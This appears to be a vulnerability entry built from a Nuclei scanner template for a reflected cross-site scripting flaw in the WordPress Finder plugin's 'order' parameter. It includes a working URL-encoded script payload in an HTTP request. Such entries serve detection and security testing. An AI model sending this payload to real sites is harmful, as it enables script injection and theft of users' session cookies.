# Vulnerability: WordPress Finder - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-finder-xss.yaml`)

## Description
WordPress Plugin Finder contains a cross-site scripting vulnerability via the order parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

